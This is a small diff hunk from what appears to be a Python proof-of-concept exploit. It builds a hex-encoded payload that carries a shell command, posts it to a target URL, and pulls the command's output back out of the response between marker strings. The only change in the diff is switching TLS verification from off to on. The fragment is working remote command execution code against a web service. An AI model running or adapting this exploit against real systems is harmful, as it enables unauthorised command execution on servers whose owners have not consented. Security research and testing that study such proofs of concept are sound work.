@@ -42,7 +42,7 @@ def poc(url):
                 payload = binascii.unhexlify(start + build_command_hex(cmd) + payload_end)
                 payload_url = "%s%s" % (url, path)
                 try:
-                    req = requests.post(payload_url, data=payload, verify=False, timeout=6, )
+                    req = requests.post(payload_url, data=payload, verify=True, timeout=6, )
                     res = re.search(b'--TAT--(.*?)--CGC--', req.content, re.DOTALL)
 
                     if res:
